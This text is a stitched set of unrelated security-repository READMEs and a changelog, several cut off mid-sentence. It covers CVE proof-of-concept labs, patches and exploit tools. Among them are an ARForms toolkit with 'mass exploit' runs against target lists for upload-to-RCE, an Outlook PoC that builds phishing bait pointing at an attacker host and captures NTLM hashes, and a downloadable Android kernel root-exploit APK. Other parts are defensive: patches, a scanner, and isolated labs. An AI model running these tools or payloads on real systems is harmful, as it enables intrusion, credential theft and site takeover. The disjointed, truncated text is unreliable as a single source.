# CVE-2026-83844_POC

**Paint A/B research; no confirmed CVE trigger yet.**

This folder compares the released Microsoft Paint **11.2605.81.0** and
**11.2609.401.0** packages. The requested **11.2605.91.0** package was not
installed, was not returned by the Microsoft Store delivery catalog on
2026-11-08, and was rejected by an exact-version WinGet query. WinGet also
rejected the authentic .81 version with the same message, so its versioned
query does not independently establish availability. The Store catalog
listed 11.2605.71.0, 11.2605.81.0, then 11.2609.401.0; see
[store-versions.txt](reports/store-versions.txt). The user approved the
11.2605.81.0 comparison. These observations do not establish that a .91 build
never existed in any private ring or archive. A [Microsoft Q&A report](https://learn.microsoft.com/en-us/answers/questions/6055591/microsoft-paint-11-2605-91-0)
also records difficulty locating it.

The result is a **signed-package, compiled-binary, and isolated A/B runtime
comparison**. Paint's original C++ source is not present in these packages.
The full file inventory and native code-section/function comparisons are
retained as data, while selected changed paths receive manual interpretation.
Raw executable-byte runs, IDA databases, proprietary pseudocode exports,
guest logs, screenshots, and Microsoft package binaries stay local and are
excluded from the public repository.

**Research status:** Both signed builds were installed in matched Windows
Sandbox guests. The same frozen runner opened 23 hashed files in each build:
23/23 exact package processes, no launch errors, no captured WER events or
dumps, and no difference in recorded titles or other captured fields. A
[pixel-level screenshot review](lab/evidence/ui-screenshot-audit.md) found
only focus-outline differences. A separate, clean four-case `Ctrl+O` debugger
pair observed both builds' image-open, error, and provenance routes; a valid
C2PA carrier reached the old SDK and new parser checkpoints. A five-case
[provenance branch matrix](lab/evidence/provenance-branch-matrix.md) then
measured backend status and reject edges for the valid carrier and four
length variants. A separate [eight-case follow-up](lab/evidence/provenance-second-branch-matrix.md)
measured the plus-one/type JPEG pair and six PNG caBX carriers. All thirteen
paired cases displayed their raster and closed cleanly; no invalid read was
observed. Separate matched
opaque/transparent file-open actions reached the decoder and handoff success
route. Clean paired `CF_DIB` paste trials independently read back the exact
format-8 payload and captured the same Paint/OLE call chain in both builds.
Before `Esc`, 148/256 pinned DIB pixels were visible under selection
decorations in each; after `Esc`, all 256 base pixels returned. The separate
async DIB continuation did not hit in this one-shot route. A corrected paired
selection action showed the same visible paste pixels in both builds, but no
nominated `SelectionTool::ReplaceContent` hit; static xrefs place that call
under a separate background-removal continuation. A separate four-case
[OLE guard matrix](lab/evidence/paired-ole-guard-branch-evidence.md)
used 824-byte `CF_DIB` allocations in each build and measured identical
baseline, short-header, declared-size, and extended-header branch outcomes.
The other five OLE guard fixtures remain offline.
Four later [Remove Background UI trials](lab/evidence/paired-removebg-ribbon.md)
reached the local model, source-alpha read, non-null output, and

# 🔐 sshole lab (CVE-2026-123158)

🐳 A Docker lab that reproduces **"sshole" (CVE-2026-123158)**, an authentication bypass in OpenSSH `sshd` when it is built against **musl libc** and **without PAM**. An account whose `/etc/shadow` password field is `*` (for example, a key-only account) accepts any password between 257 and 1024 bytes.

📚 **References:** [sshhole.com](https://sshhole.com) (the discoverer's write-up) and [github.com/oz9un/sshole](https://github.com/oz9un/sshole) (the original PoC).

> ⚠️ For research and defense on systems you own. The ports are meant for `localhost` only. Do not expose this lab to a network.

## 🐛 Vulnerability summary

The bug comes from two behaviors that are each reasonable on their own:

1. **🔑 OpenSSH compares crypt output with the stored field.** For an account with `*` as its password field (locked or key-only), `sshd` has no real hash to compare against. Since CVE-2016-6210, it substitutes a salt from another account so that unknown and locked accounts take similar time to reject. It then compares the `crypt()` output with the stored `*`.
2. **⚙️ musl's `crypt()` returns `*` on failure.** The SHA-512 crypt implementation in musl rejects keys longer than 256 bytes and returns `*` instead of NULL. A password of 257 to 1024 bytes therefore produces `*`, which matches the locked account's stored `*`.

Together, a password of 257 to 1024 bytes logs into any account whose field is `*` on a musl system where `sshd` checks passwords itself (no PAM). Fixed in OpenSSH 10.6p2; Alpine backported the fix to its packages (see "Why OpenSSH is built from source").

## 🧪 What it demonstrates

| Container | libc | sshd | Target account `alice` | Expected result with a 300-byte password |
|---|---|---|---|---|
| `sshole-alpine-vuln` | musl (Alpine 3.18) | OpenSSH 9.3p2 built without PAM | field `*` | **✅ Login accepted (vulnerable)** |
| `sshole-debian-control` | glibc (Debian 12) | Debian's OpenSSH with PAM | field `*` | **❌ Rejected (control)** |

With a 256-byte password, the vulnerable container also rejects the login. musl's limit (256 bytes for sha512crypt) is not reached, so `crypt()` returns a real hash that does not match.

## 📋 Requirements

- 🐳 Docker with Compose v2 (`docker compose`).
- 🌐 Internet access during the build: the build downloads packages from Alpine and Debian and the OpenSSH tag from GitHub.
- ⚠️ On hosts with an IPv6 link-local DNS server, the build can fail to resolve names. The compose file uses `network: host` for the builds to avoid this.

## 🔍 Checking exposure with check.sh

`check.sh` is the official checker from the sshole repository. It reports whether the local `sshd` meets the exposure conditions, but it does not attempt a login.

```bash
docker cp check.sh sshole-alpine-vuln:/tmp/check.sh
docker exec sshole-alpine-vuln sh /tmp/check.sh      # EXPOSED, exit 0
docker cp check.sh sshole-debian-control:/tmp/check.sh
docker exec sshole-debian-control sh /tmp/check.sh   # not exposed (not musl), exit 1
```

## 🚀 How to run it

From `sshole-lab/`:

```bash
# Start both servers (build included)
docker compose up -d --build

# Run the full reproduction
bash run_exploit.sh
```

### 🎯 Manual attack

Or attack manually once the containers are running:

```bash
# Syntax: attack.py HOST PORT USER LENGTH
docker compose --profile attack run --rm attacker sshole-alpine-vuln 22 alice 300
```

Inside the Docker network the port is always `22`. The host ports are `2222` (Alpine) and `2223` (Debian), if you want to connect from outside Docker with `ssh -p 2222 alice@localhost`.

# CVE-2026-125350 / EUVD-2026-121390: Google Chrome XML Use-After-Free

## Overview
A Use-After-Free (UAF) vulnerability (CWE-416) exists in the XML processing component of Google Chrome. By crafting a malicious XML document and convincing a user to open it, an unauthenticated attacker can trigger memory corruption. Successful exploitation can lead to the execution of arbitrary code with the privileges of the Chrome process.

**⚠️ NOTE:** This repository contains a **PoC Skeleton** only. It demonstrates the trigger flow and XML structure but does **not** contain the weaponized heap grooming or RCE logic. 

## Affected Versions
* Google Chrome < 134.0.6998.45
* Chromium-based browsers (Microsoft Edge, Brave, Opera) < equivalent builds
*(Note: Verified on Chrome 133.0.6943.126 and 134.0.6998.35 on Linux)*

## Root Cause
**CWE-416: Use After Free**
The vulnerability is triggered during the parsing and processing of specific XML structures. The XML parser frees an object in memory but fails to clear the pointer. Subsequent operations on the malicious XML document reference this dangling pointer, leading to a controlled use-after-free condition. This allows an attacker to manipulate the heap layout and potentially achieve remote code execution (RCE) within the Chrome sandbox.

## Usage
The script provides a skeleton CLI to generate the base XML structure.

```bash
pip install -r requirements.txt

# Generate the standalone base XML file (Skeleton)
python exploit.py --generate payload.xml
```

# Changelog

## 0.3.0 — 2026-11-10

Depth and formats release: the pickle inspector is now an abstract
interpreter, and four non-pickle artifact formats are checked natively.

- VM-tracking pickle analysis: a symbolic stack over `pickletools`
  disassembly resolves which callables a pickle *actually invokes* via
  REDUCE / NEWOBJ / NEWOBJ_EX / INST / OBJ, tracking values through the
  memo (PUT/GET) and STACK_GLOBAL. This defeats the memo evasion (callable
  stored with BINPUT, fetched with BINGET at REDUCE time) and makes the
  invocation rules precise: a dangerous global that is merely referenced
  is reported as `PICKLE-DANGEROUS-GLOBAL`, never as an invocation.
- Nested pickles: pickle streams embedded in bytes constants are analysed
  recursively (depth-capped) and merged into the parent's findings.
- Container peeling before raw analysis (depth-capped): gzip, bzip2, xz,
  and zlib wrappers are decompressed; zip and tar members that look like
  pickle streams are inspected (extending the existing torch-zip
  behaviour). 7-Zip archives cannot be read with the standard library and
  are flagged `PICKLE-CONTAINER-OPAQUE` (high) — the opaque-container
  route used by the NullifAI Hub-scanner evasion.
- New rule `PICKLE-UNPARSEABLE` (medium) for streams that yield no valid
  opcodes; parseable benign pickles still get `PICKLE-FILE-PRESENT`.
- New formats: `.npy` object arrays have their pickle payload analysed
  (fixed-width arrays are info-level `NPY-DATA-ARRAY`); `.npz` members are
  checked per-file; `.keras` configs are checked for marshal-loading
  Lambda layers (`KERAS-LAMBDA-LAYER`, high); `.safetensors` and `.gguf`
  get header-level info checks (`SAFETENSORS-FORMAT`, `GGUF-FORMAT`).
- Hub mode now also downloads and inspects `.npy`, `.npz`, `.keras`, and
  `.gguf` files under the same size cap. `.safetensors` is not downloaded
  in Hub mode (too large for a header check).
- See `docs/FORMATS-AND-DEPTH.md` for how the analysis works and its
  limits. Zero dependencies, as always.

## 0.2.1 — 2026-11-10

Adoption and CI/CD release. No scanner-rule changes.

- GitHub Action hardened: installs the pinned PyPI release instead of an
  unpinned Git checkout; new inputs `output`, `exclude` (comma-separated),
  `version`, and `python-version`; Marketplace branding added.
- CI/CD guide (`docs/CI-CD.md`) with the exit-code contract (0 pass,
  1 threshold reached, 2 scan error) and copy-ready pipelines for GitHub
  Actions (including SARIF upload to code scanning), GitLab CI, Azure
  Pipelines, and Jenkins under `examples/cicd/`.
- Worked supply-chain example: a pipeline that downloads the existing
  `datasets==5.1.0` wheel without installing it, extracts it, and fails on
  the real CVE-2026-57845 sink (`docs/EXISTING-PACKAGE-EXAMPLE.md`).
- Demo (`docs/DEMO.md`, animated terminal in the README) and a README
  comparison table positioning pickle-sentry against model-file scanners.

## 0.2.0 — 2026-11-09

- Hugging Face Hub scanning: `pickle-sentry hub <user/repo>` for datasets,
  models, and spaces — downloads pickle-family files (64 MB cap), inspects
  them by disassembly including the pickle stream inside torch zip archives,
  and AST-scans repository Python files.
- New rule `PICKLE-REDUCE-CALLABLE` (high): pickle files that invoke
  non-standard callables via `REDUCE` — the shape of the published
  CVE-2026-57845 proof-of-concept payload.

# CVE-2026-124194 PoC — Outlook Spoofing / Forced Authentication (NTLMv2 Leak)

🇰🇷 **한국어 (기본)** | **[English](README.md)**

A proof-of-concept for the Microsoft Outlook spoofing zero-day patched in the November 2026 Patch Tuesday.

> [!IMPORTANT]
> **This PoC is a proof-of-concept only. It has NOT been tested against a vulnerable Outlook environment.** Only file structure validation (olefile parsing) was verified. Actual exploitability must be verified independently in your own lab.

> **CVE-2026-124194** — Microsoft Office Outlook Spoofing Vulnerability
> CVSS 6.5 (Moderate) · MS "Exploitation Detected" · CISA KEV cataloged (2026-11-10, due 2026-11-24)

## Overview

CVE-2026-124194 belongs to the same family as CVE-2023-23397. If an attacker-controlled
UNC path is planted in a resource that Outlook dereferences automatically during
rendering (e.g. the reminder sound path of a message file), Outlook attempts SMB
authentication to that path **without showing the external content warning**, and
Windows automatically sends the NTLMv2 hash.

The leaked hash can be used for offline cracking or relay attacks (Exchange, LDAP,
file servers, etc.).

## Components

| File | Purpose |
|---|---|
| `cfb.py` | Minimal CFB (Compound File Binary) v3 writer — builds a real OLE container (ministream compliant) |
| `make_msg.py` | Generates a real-format .msg with the trigger property (`PidLidReminderFileParameter`, `0x851F`) holding a UNC path + phishing mail (.eml) wrapper |
| `gen_poc.py` | (Legacy) EML manifest approach — kept for concept illustration |
| `collect_ntlm.py` | NTLMSSP Type3 capture listener for the attacker host — hash collection verification |

## Usage

```bash
# 1) Start the hash collection listener on the attacker host (sudo needed for 445)
python3 collect_ntlm.py --port 445

# 2) Generate the trigger-laden .msg + phishing mail
python3 make_msg.py --attacker-host <ATTACKER_IP> --out bait.msg --eml bait.eml

# 3) Verify the output (olefile parses OLE structure + UNC value — done automatically)
```

The generated `bait.msg` satisfies the following when parsed with olefile:

- `__substg1.0_851F001F` stream = `\\<ATTACKER_IP>\share\reminder.wav`
- This corresponds to `PidLidReminderFileParameter` (PSETID_Common named property),
  which a vulnerable Outlook dereferences over SMB when the file is opened.

## Structural verification (generator level)

```
[+] Generated: bait.msg (2560 bytes)
[+] Trigger: PidLidReminderFileParameter = \\10.0.0.5\share\reminder.wav
[+] CFB signature OK (D0 CF 11 E0 A1 B1 1A E1)
[+] olefile parsed: __properties_version1.0 / __substg1.0_001A001F / __substg1.0_851F001F
[+] PidLidReminderFileParameter stream verified: \\10.0.0.5\share\reminder.wav
```

> [!WARNING]
> The above verifies **the structure of the generated file only**. Whether an actual
> SMB connection occurs and NTLMv2 leaks from a vulnerable Outlook was NOT tested.

## Patch status

| Product | Fixed build (>=) |
|---|---|
| Microsoft 365 Apps for Enterprise | 2026-11-10 channel security release |
| Office LTSC 2024 | 16.0.17932.21140 |
| Office LTSC 2021 | 16.0.14334.21048 |

Patched Outlook shows the external content warning, blocking this PoC's trigger.
Unpatched builds execute the trigger without a warning.

## Mitigations (pre-patch)

1. Block outbound SMB (TCP 445/139) + WebDAV at the perimeter
2. GPO `Network security: Restrict NTLM` (Audit → Deny all)
3. Enforce SMB signing (prevents internal relay)
4. Compromise triage: Event IDs 4624/4648 (NTLM logon to external targets), `OUTLOOK.EXE` authenticating to unknown external hosts

# ACW3 — CVE-2026-63686 (Apache `mod_xml2enc` DoS)

Target environment and demo material for INF2005 ACW3: a NULL pointer dereference in `mod_xml2enc` (Apache HTTP Server ≤ 2.4.68, fixed in 2.4.69) triggered by a proxied response whose charset conversion partially succeeds, then fails. CVSS 7.5 (High) — denial of service.

## Repository Layout
```
attacker/poison.py          malicious backend that crashes the vulnerable Apache
iso/                        Debian (bookworm) netinst, Kali installer, httpd 2.4.69 source
docs/specs/                 coursework specification + approved CVE list
docs/demo/                  VM setup + demo guides (see below)
demo-scripts/               numbered demo scripts for the live assessment (see demo-scripts/README.md)
```

## Environment
Builds on two UTM/QEMU VMs on an isolated host-only network (`192.168.128.0/24`, no WAN):

| Host | IP | Role |
|---|---|---|
| target VM (Debian 12) | `192.168.128.10` | Apache 2.4.68 reverse proxy, vulnerable; fixed 2.4.69 on port 8081 for the remediation contrast |
| attacker VM (Kali) | `192.168.128.20` | `poison.py` backend on port 8080 + attack console |

Snapshots give repeatable demo states: `S0-clean-vuln` (target), `S1-poison-ready` (attacker), `S3-fixed-ready` (fixed build). Snapshots are reverted, never rebuilt.

## Setup Guides (in order)
1. `docs/demo/S0-Target-VM-Setup.md` — target VM: Debian, vulnerable Apache config, snapshot `S0-clean-vuln`
2. `docs/demo/S1-Attacker-VM-Setup.md` — attacker VM: Kali, `poison.py`, crash reproduction, snapshot `S1-poison-ready`
3. `docs/demo/S3-Fixed-Server-Setup.md` — Apache 2.4.69 from source, remediation contrast, snapshot `S3-fixed-ready`

## PoC in one line
```bash
curl -v http://192.168.128.10/    # from attacker VM (poison running)
```
Expected on the target: `AH01445 Failed to convert input` → `AH00052 child pid ... Segmentation fault (11)` in `/var/log/apache2/error.log`, empty reply to the client. Same PoC against port 8081 (2.4.69) returns HTTP 200 with zero segfaults.

# PS17-SEC — unofficial security patches for PrestaShop 1.7

Free, source-available security backports for **PrestaShop 1.7.8.11**, the last
release of the 1.7 line.

PrestaShop stopped shipping security fixes for 1.7 when PrestaShop 9 was
released in **June 2025**. The last 1.7 release, `1.7.8.11`, was January 2024.
There is **no extended support programme** for 1.7, paid or free.

> **Not affiliated with PrestaShop SA.** Independent and unofficial, no
> endorsement. If you can upgrade to a supported release, do that instead.
> These patches are for shops that cannot, yet.

---

## What is patched

| ID | CVE | Issue | Severity |
|----|-----|-------|----------|
| [PSEC-0001](advisories/PSEC-0001.md) | CVE-2026-44212 | Stored XSS in the back-office customer service view | Critical |

**An unauthenticated visitor can take over the back office.** Submit the public
Contact Us form with a payload in the email field; it fires when staff open the
thread.

The published range is `< 8.2.6`, which numerically includes every 1.7 release.
Unlike the usual end-of-life argument, nobody has to be convinced 1.7 is in
scope — the vendor's own range says so. There is simply no fix shipped for it.

## Verify before trusting it

```sh
php tests/probe.php /path/to/your/prestashop        # is it vulnerable?
php tests/regression.php /path/to/your/prestashop   # does the template still work?
```

On a stock `1.7.8.11` tree the probe reports **1 vector vulnerable** and the
regression harness reports **4 payloads not neutralised**. After the patch:
**0 vulnerable, 18 ok, 0 regressions**, with ordinary addresses — apostrophes,
non-ASCII — still round-tripping exactly.

Both exit non-zero when something is wrong, so they work in CI.

## Applying it

Back up first.

```sh
cd /path/to/your/prestashop
patch -p1 -F0 -i /path/to/ps17-sec/patches/0001-*.patch
```

`-F0` matters. GNU patch defaults to a fuzz factor of 2, which lets context
match at a shifted offset, so the same patch can apply twice. Zero fuzz means
exact context or refusal.

**Do not use `git apply`.** Inside a git repository it resolves paths from the
repository root and silently ignores paths outside it, exiting 0 having changed
nothing.

### File touched

```
admin-dev/themes/default/template/controllers/customer_threads/helpers/view/view.tpl
```

If your shop uses a custom admin theme, check whether it overrides this
template. If it does, the same two lines need the same filter there.

## Rebuilding the patches

```sh
python tools/make_patches.py
```

Downloads 1.7.8.11 if not cached, applies each fix as its own commit, and emits
the patches. The commit date is pinned so rebuilds are byte-identical.

## Honest limits

- **The proof is template analysis, not exploitation.** The probe verifies every
  render site escapes. It does not stand up PrestaShop and run the attack.
- **One template examined.** Other unescaped renderings elsewhere in the 1.7
  back office are likely and were not searched for.
- **1.7.8.11 only.** Earlier 1.7.x releases probably share the defect but were
  not tested.
- **Part of the upstream fix is deliberately omitted.** Upstream also tightened
  email validation, which 1.7 cannot do the same way. Approximating it would
  change behaviour on every email field on the site. See the advisory.
- **Not a complete audit.** One CVE, verified properly. That is all this claims.

## Related

- [eol-watch](https://github.com/fstivicic/eol-watch) — the scanner that finds
  advisories landing on dead branches, and the cookbook this patch followed.
- [joomla3-security-patches](https://github.com/fstivicic/joomla3-security-patches)
  — the same method applied to Joomla 3.10.

## Licence

Patches are derivative works of PrestaShop. PrestaShop core is OSL-3.0; the
patches are offered under the same terms. Tooling in `tools/` and `tests/` is
MIT.

# 贡献指南

## 加一个内核 profile

1. 用官方固件包里的 `boot.img` / `Image`（不是整包 zip）在 App 的「标定」页解析；
2. 把解析结果里的 `release`、`prefix`（含 `g<hash>`）、符号地址、BTF 偏移、三个 call site 填进 `ConfigGen.BUILTIN_PROFILES`；
3. 在 `docs/supported-kernels.md` 里补一行，注明**是否真机验证过**（`真机` / `仅解析`）；
4. 跑 `./gradlew :app:testDebugUnitTest` —— `ConfigProfileTest` 会校验 `device.cfg` 的字节布局与 payload 读取顺序一致。

同一 `release` 下不同 build 必须分开写（按 `g<hash>`），不要合并、不要用「前 22 字符相同」判等。

## 提 PR 前

- `./gradlew :app:testDebugUnitTest` 全绿；
- `python tools/build_payload.py` 后 `SHA256SUMS.txt` 与 `PayloadCatalog.kt` 同步（`PayloadCatalogTest` 会查）；
- 不要在日志、截图、测试数据里留设备序列号、`android_id`、卡密、他人服务器的 token。

## 代码风格

Kotlin：4 空格缩进、`val` 优先、公开 API 写 KDoc 说明「为什么这么做」而不只是「做了什么」。
C payload：只用 `syscall()` 直调，不依赖 bionic 的封装；任何可能 panic 的写操作前必须有前置校验。

# ExtractKit

**面向荣耀 / MagicOS 的内核 exploit 实验工具**：把 *本机 boot 镜像里的 kallsyms 与结构偏移* 自动算成 payload 需要的常量，然后跑 CVE-2026-98260（POSIX CPU timer UAF → 8 字节零写 → 伪造 cred → `ksud late-load` 装载 KernelSU）。

[![CI](https://github.com/qq2770355800/ExtractKit/actions/workflows/build.yml/badge.svg)](https://github.com/qq2770355800/ExtractKit/actions/workflows/build.yml)

界面用 Jetpack Compose + 真实背景采样的「液态玻璃」实现；所有提权动作在 Shizuku 提供的 shell 上下文里执行（也可在 KernelSU 的 `su` 下运行）。


![首页](docs/img/home.png)

<sub>左：主页（真实背景采样 + 液态玻璃）。运行日志在同窗口弹出，不再另开 Dialog。</sub>

> 这是一个**研究/自用**项目。它会改内核对象、可能 panic 重启、可能丢失数据；只在**你自己的设备**上跑。

---

## 直接下载 APK

不用自己编译，点这里拿最新的 release 包：

**[→ 最新构建（Actions）](https://github.com/qq2770355800/ExtractKit/actions/workflows/build.yml)**

打开最新一次成功的 run → 页面底部 **Artifacts** → 下载 `ExtractKit-release.zip` → 解压得到 `app-release.apk`。

装之前请确认：Android 12+ / arm64、Shizuku 已授权（或已有 KernelSU 的 `su`）、并在「标定」里导入过本机 boot 镜像（或正好命中内置 profile）。

---

## 它解决什么问题

公开的 98260 exploit 都是「一台机器编一份」，因为下面这些值全在编译期写死：

| 需要的值 | 来源 |
| --- | --- |
| `do_timer_create` / `selinux_state` / `panic_on_warn` / `root_user` / `init_user_ns` / `init_groups` 的绝对地址 | 内核 `kallsyms` 表（需先解 KASLR 前的链接期地址） |
| `kfree`/`kalloc` 调用点（call site） | 反汇编 `do_timer_create` / `prepare_creds` / `copy_process` 里的 `bl kmem_cache_alloc*` |
| `struct cred` / `task_struct` / `k_itimer` 的字段偏移 | 内核内嵌 `.BTF`，没有 BTF 时从 `cred_init` / `fork_init` / `exit_creds` 的常量反推 |
| KASLR slide | 运行时从 `kmem_cache_alloc` 的 trace 记录反推 |

ExtractKit 把这四步全放进手机里做：

```
boot.img / Image  ──►  KallsymsFinder ──►  Btf 解析 / 汇编常量  ──►  device.cfg (336 B)
                                                                    │
                                                                    ▼
                                                          payload（静态 arm64）
```

`device.cfg` 是 336 字节的定长结构（magic `EXKCFG01`），payload 读它就知道该往哪写、写多大。

## 功能

- **标定**：选一个官方 `boot.img` / `Image`，本地解出符号表、BTF 偏移、call site，存成 profile；同内核设备导入后免标定。
- **内置 profile**：仓库里带的 `BUILTIN_PROFILES` 全部来自我们自己解析的官方镜像，每条都注明机型 / 内核 release / 是否真机验证过。
- **识别表**：只有型号没有偏移的内核，用 `Known` 列表给「服务器已收录 / 需标定」的提示，不会冒充可提权。
- **提权**：读模式（只自检）与写模式（fake cred）分开；成功判定只认 `su -c id` 的 `uid=0`，命中日志标记不算。
- **安全模式**：装载前把 `/data/adb/modules/*` 临时 disable，失败/成功都恢复。

# CVE-2026-87772 — Pardus About Local Privilege Escalation

A passwordless Polkit action in **Pardus About** (`pardus-about`) runs a root
helper that mounts every attached partition with `defaults,ro` — **without
`nosuid`**. An unprivileged user with an active desktop session can therefore
place a setuid-root binary on a disk they control and execute it as **root**, with
no password and no second vulnerability.

| | |
|---|---|
| **CVE** | [CVE-2026-87772](https://www.cve.org/CVERecord?id=CVE-2026-87772) |
| **Advisory** | [SSB / USOM TR-26-1521](https://siberguvenlik.gov.tr/guvenlik-bildirimleri/detay/tr-26-1521) |
| **Write-up** | [jankesec.com — Root Escalation Through the Pardus About Mount Helper](https://jankesec.com/research/cve-2026-87772-pardus-about-root-mount/) |
| **CVSS 3.1** | 7.8 (High) — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-863 (Incorrect Authorization) + CWE-266 (mount without `nosuid`) |
| **Affected** | `pardus-about` < 1.2.5 (reproduced against 1.2.4 on Pardus 25.2) |
| **Fixed** | 1.2.5 — commits [`59ff522`](https://github.com/pardus/pardus-about/commit/59ff522ee7f269c9c189c69de44a5c8654f07a48), [`b439777`](https://github.com/pardus/pardus-about/commit/b439777359637bbd7750d9cc2570d250162ab0ef) |
| **Credit** | Sevban Dönmez ([jankesec](https://github.com/jankesec)) — coordinated disclosure |

## The vulnerability

Two independent weaknesses combine into a reliable local root primitive:

1. **Passwordless authorization (CWE-863).** The Polkit action
   `tr.org.pardus.pkexec.pardus-about.system_info` is `allow_active=yes`, so any
   user in the active seat (`seat0`) session can run its `dualboot` helper as root
   through `pkexec` with no authentication prompt.
2. **Mount without `nosuid` (CWE-266).** The helper mounts every partition it finds
   under `/sys/block` at `/run/winroot` with `mount -o defaults,ro`. `defaults`
   never sets `nosuid`, `nodev` or `noexec`, so a root-owned setuid binary on the
   mounted filesystem keeps `euid=0` when executed.

The helper also never validates that the device is a fixed internal disk rather
than removable media the user just attached, so an attacker-controlled USB stick
(or, in this lab, a loop device) is mounted exactly like an internal partition.

To make the short mount window deterministic, the attacker disk ships
`/etc/os-release` as a **FIFO**. The root helper blocks reading it, which keeps the
disk mounted until the unprivileged process has launched the setuid-root shell.

Everything was reproduced in an **isolated VM**, never against third-party systems.

- Pardus GNU/Linux 25.2 with `pardus-about` 1.2.4 installed.
- Two local accounts: `hacker` (builds the disk; has `sudo` only on the attacker's

  USB flash drive**, and the SSH copy simulates handing that USB to the victim. In
  the real world the attacker only needs to get removable media holding a
  setuid-root file onto the machine — no `sudo`, no network step.

# CVE-ARFORMS — ARForms exploitation toolkit

Two exploit tools for two generations of the same unauthenticated upload primitive:

| Tool | Target generation | Wire format |
|---|---|---|
| `poc.py` | ARForms **≤ 7.2.4** | `field_id=<hash>`, empty `types_arr` |
| `poc67.py` | ARForms **6.x** (verified on 6.0 / 6.7 / 6.8.1) | `field_id=<id>`, filled `types_arr`, WAF-safe part name |

`poc.py` also covers two stored-XSS issues. All were patched upstream in ARForms **7.3** (the
6.x line predates the fix):

| CVE | Class | Endpoint |
|---|---|---|
| **CVE-2026-111190** | Arbitrary file upload → **RCE** | `arf_send_form_data` (`wp_ajax_nopriv_`) |
| **CVE-2026-12424** | Stored XSS via `Referer` | `arf_save_incomplete_form_data` (`wp_ajax_nopriv_`) |
| **CVE-2026-12427** | Stored XSS via `description` | same handler, `maybe_unserialize()` sink |

## Usage

```bash
python3 poc.py            # interactive menu (primary entry point)
```

```
1  single scan          fingerprint one target
2  single exploit       upload -> verify execution (writes to target)
3  mass scan            scan a file of targets
4  mass exploit         exploit a file of targets (+ optional XSS store)
0  exit
```

Scripting form:

```bash
python3 poc.py --url http://target --scan
python3 poc.py --url http://target --exploit --xss
python3 poc.py --targets list.txt --exploit --workers 4 --out hits.txt
python3 poc.py --url http://target --exploit --ext php --ext phtml   # override the chain
```

> **Concurrency note.** Some shared hosters answer a rejected/garbled upload instead of
> blocking when several PHP-FPM requests land at once. The tool retries each send with
> backoff (3 tries) and the default `--workers` is 4. If a batch shows `NOUP` on targets that
> succeed individually, re-run that slice with `--workers 1`.

### Partial hosters: the `NOUP` retry rule

`REFUSED` and `NOUP` are different things and must not be conflated:

* `REFUSED` — the .jpg control went through, so the API works and the executable
  extensions were blocked → **patched**, a reportable fact about the target.
* `NOUP` — even the control failed → the tool never established the API contract.
  Re-run sequentially before concluding anything; never report such a host as patched.

Options: `--timeout`, `--workers`, `--proxy`, `--ext` (repeatable), `--out`, `--xss`.

Requirements: **Python 3.8+, stdlib only** (no `requests`, no third-party packages).

## Status tags (honest — no optimistic labelling)

| Tag | Meaning |
|---|---|
| `RCE` | an uploaded file was fetched and its execution **proven** (`uid=` returned) |
| `UPLOAD` | file written but execution not achieved (PHP-in-uploads disabled, wrong path) |
| `REFUSED` | the **.jpg control upload was accepted** but every executable extension was rejected → the target speaks the API and is **patched** |
| `NOUP` | even the .jpg control was rejected → the upload API contract is not matched (other build / hardened front-end); verdict honestly **unknown**, not patched |
| `NOFORM` | no published form carrying a file field — the `AC:H` precondition of 111190 is absent |
| `UNREACHABLE` | network/TLS failure |
| `PATCHED` / `VULN-ver` | scan-mode version ve

# CVE-2026-126537 — Ninja Forms – File Uploads ≤ 3.3.36

## Unauthenticated arbitrary file deletion / read via `files[].data.file_path` + `extra.saveProgress`

| | |
|---|---|
| CVE | CVE-2026-126537 |
| Vendor product | Ninja Forms – File Uploads (`ninja-forms-uploads`), premium add-on for Ninja Forms |
| Affected | ≤ 3.3.36 |
| Fixed | 3.3.37 (released 2 November 2026) |
| CVSS 3.1 | 9.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` |
| CWE | CWE-22 (Improper Limitation of a Pathname) — advisory classifies as LFI |
| Researcher credit | daroo (WPScan) |
| Reported | 2026-11-11 (WPScan vdb `c2acd746-84cd-4233-8ac5-d7fc73179ca0`, Wordfence id `3670e2aa-6d8e-4ba5-ab65-49bd2a3dcacc`) |
| Public PoC before this work | none found (no NVD record, no CVE.org record, no public exploit) |
| Tested tool | `poc.py` in this directory (menu + CLI, stdlib only) |

---

## 1. Executive summary

A public (unauthenticated) Ninja Forms submission can carry a `files[]` array of its
own choosing when the payload also contains a non-empty `extra.saveProgress`. The File
Uploads add-on sees the `saveProgress` flag, returns from
`NF_FU_Fields_Upload::process()` immediately, and leaves the client-supplied file
entries in place instead of replacing them with server-derived data. The "External File
Upload" action then hands `files[].data` to
`NF_FU_External_Abstracts_Service::process_upload()`, which — before 3.3.37 — reloaded
the authoritative upload row **only when the client sent an `upload_id`**. With the
`upload_id` omitted, the attacker's `data[file_path]` survives into the external upload
pipeline, where it is used both as the **source file of an upload to the configured
S3/Dropbox/Google Drive bucket** (arbitrary file read) and, in the background worker, as
the argument of **`unlink()`** in `maybe_delete_server_file()`, with no
upload-directory containment check (arbitrary file deletion).

Deleting `wp-config.php` drops WordPress into its setup screen
(`302 → /wp-admin/setup-config.php`), which is the site-takeover path the advisory
describes — and that path was driven all the way to an administrator account and
remote code execution in this lab (§9b).

Lab reproduction (this project) reached the controlled outcome end to end: the file is
read out to the bucket **and** unlinked, and the site answers `302 /wp-admin/setup-config.php`.
The same payload against the released 3.3.37 changes nothing (negative control).

## 2. Affected code (3.3.37 line numbers; the patched release)

| file | symbol | role |
|---|---|---|

| `includes/fields/upload.php` | `discard_submitted_file_data()` L519, `without_file_data()` L581, `discard_unprocessed_field()` L557 | **added in 3.3.37** — strip client file data |

## 3. Root cause

### 3.1 The `saveProgress` early return (entry gate)

`NF_FU_Fields_Upload::process( $field, $data )` runs for the upload field during the
public submission. In 3.3.37:

```php
if ( isset ( $data[ 'extra' ][ 'saveProgress' ] ) && ! empty( $data[ 'extra' ][ 'saveProgress' ] ) ) {
    return $this->discard_submitted_file_data( $data, $field['id'] );   // 3.3.37
}
```

`discard_submitted_file_data()` (and `without_file_data()`, which unsets the `data` key
of every submitted file) are new in 3.3.37. Before the fix the branch was a plain
`return $data;` — the docblocks say so explicitly (`@since 3.3.37 (Issue #983)`).

Crucially, `saveProgress` arrives from the client: Ninja Forms core only reserves
`calculations` and `product_fields` in `extra`
(`Submission.php::getReservedExtraKeys()`), so `extra.saveProgress` is stored verbatim
into `$this->_data['extra']` and is visible to every field/action `process()` call.

Ninja Forms core also whitelists the client `files` array into the field:
